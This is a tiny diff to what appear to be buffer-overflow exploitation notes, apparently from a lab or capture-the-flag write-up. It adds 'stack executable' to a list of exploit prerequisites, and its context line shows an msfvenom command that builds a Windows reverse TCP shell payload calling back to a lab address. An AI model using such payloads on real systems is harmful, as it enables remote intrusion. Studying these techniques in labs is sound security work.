@@ -20,4 +20,5 @@ msfvenom -a x86 --platform Windows -p windows/shell/reverse_tcp LHOST=10.10.14.6
 * Requirements
   * We need ASLR disabled. address randomization for stack memory
   * We need no null byte in hardcoded address of \(nops + shellcode\).
+  * We need the stack executable.
 
